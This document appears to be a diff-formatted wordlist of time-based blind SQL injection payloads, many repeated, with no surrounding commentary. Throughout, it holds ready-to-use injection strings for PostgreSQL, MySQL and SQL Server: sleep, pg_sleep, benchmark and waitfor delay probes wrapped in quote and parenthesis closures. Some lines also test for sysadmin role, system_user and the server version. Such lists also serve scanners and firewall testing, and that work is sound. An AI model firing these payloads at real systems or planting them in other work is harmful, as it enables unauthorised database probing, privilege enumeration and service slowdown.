+"   )    )    or pg_sleep  (  __TIME__  )  --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+,waitfor delay '0:0:__TIME__'--
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+a' waitfor delay '0:0:10'--
+1 or pg_sleep  (  __TIME__  )  --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+1 waitfor delay '0:0:10'--
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+pg_sleep  (  __TIME__  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   or sleep  (  __TIME__  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   or sleep  (  __TIME__  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1  )   or sleep  (  __TIME__  )  #
+ )   or pg_sleep  (  __TIME__  )  --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1  )   or sleep  (  __TIME__  )  #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+or sleep  (  __TIME__  )  #
+a' waitfor delay '0:0:10'--
+1  )   or sleep  (  __TIME__  )  #
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1%"   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ )    )    or pg_sleep  (  __TIME__  )  --
+1   )    )    or sleep  (  __TIME__  )  #
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+sleep  (  __TIME__  )  #
+1" where 7739  =  7739 and sleep  (  5  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1  )   or sleep  (  __TIME__  )  #
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+"   )    )    or pg_sleep  (  __TIME__  )  --
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1"   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+"   )    )    or pg_sleep  (  __TIME__  )  --
+"   )    )    or pg_sleep  (  __TIME__  )  --
+1'  )   rlike sleep  (  5  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+or sleep  (  __TIME__  )  #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+ )    )    or pg_sleep  (  __TIME__  )  --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or sleep  (  __TIME__  )  #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+"  )   or pg_sleep  (  __TIME__  )  --
+1" where 7739  =  7739 and sleep  (  5  )  --
+1 or pg_sleep  (  __TIME__  )  --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+ )    )    or sleep  (  __TIME__  )    =  '
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or sleep  (  5  )  #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+ )    )    or pg_sleep  (  __TIME__  )  --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1 waitfor delay '0:0:10'--
+or sleep  (  __TIME__  )  #
+1  )   or sleep  (  __TIME__  )  #
+1 or pg_sleep  (  __TIME__  )  --
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or sleep  (  __TIME__  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1'  )   rlike sleep  (  5  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or pg_sleep  (  __TIME__  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ )   or pg_sleep  (  __TIME__  )  --
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+or sleep  (  __TIME__  )  #
+ )   or sleep  (  __TIME__  )    =  '
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ )   or sleep  (  __TIME__  )    =  '
+1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ )   or pg_sleep  (  __TIME__  )  --
+a' waitfor delay '0:0:10'--
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1'  )   rlike sleep  (  5  )  #
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ )    )    or pg_sleep  (  __TIME__  )  --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+"   )    )    or pg_sleep  (  __TIME__  )  --
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"  )   or sleep  (  __TIME__  )    =  "
+1   )    )    or pg_sleep  (  __TIME__  )  --
+" or sleep  (  __TIME__  )  #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   or sleep  (  __TIME__  )  #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+ )    )    or sleep  (  __TIME__  )    =  '
+1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1"   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1%" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+"  )   or pg_sleep  (  __TIME__  )  --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+ )   or sleep  (  __TIME__  )    =  '
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+" or pg_sleep  (  __TIME__  )  --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1  )   or sleep  (  __TIME__  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ )   or pg_sleep  (  __TIME__  )  --
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+sleep  (  __TIME__  )  #
+ )   or sleep  (  __TIME__  )    =  '
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1" where 7739  =  7739 and sleep  (  5  )  --
+1" where 7739  =  7739 and sleep  (  5  )  --
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+a' waitfor delay '0:0:10'--
+ )    )   ,waitfor delay '0:0:__TIME__'--
+or sleep  (  __TIME__  )  #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1  )   or sleep  (  __TIME__  )  #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1 or pg_sleep  (  __TIME__  )  --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1 waitfor delay '0:0:10'--
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+ )    )    or pg_sleep  (  __TIME__  )  --
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+ )   or pg_sleep  (  __TIME__  )  --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+a' waitfor delay '0:0:10'--
+or sleep  (  __TIME__  )  #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+";waitfor delay '0:0:__TIME__'--
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+ )   or sleep  (  __TIME__  )    =  '
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1'  )   rlike sleep  (  5  )  #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+" or pg_sleep  (  __TIME__  )  --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )    or pg_sleep  (  __TIME__  )  --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+or sleep  (  __TIME__  )  #
+,waitfor delay '0:0:__TIME__'--
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+ )    )   ,waitfor delay '0:0:__TIME__'--
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+"   )    )    or pg_sleep  (  __TIME__  )  --
+" or sleep  (  __TIME__  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ )    )   ,waitfor delay '0:0:__TIME__'--
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )    or sleep  (  __TIME__  )    =  '
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1%" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1   )    )    or sleep  (  __TIME__  )  #
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1%"   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+or sleep  (  __TIME__  )    =  '
+1   )    )    or sleep  (  __TIME__  )  #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+or sleep  (  __TIME__  )  #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1 waitfor delay '0:0:10'--
+1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --
+1'  )   rlike sleep  (  5  )  #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1  )   or sleep  (  __TIME__  )  #
+1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
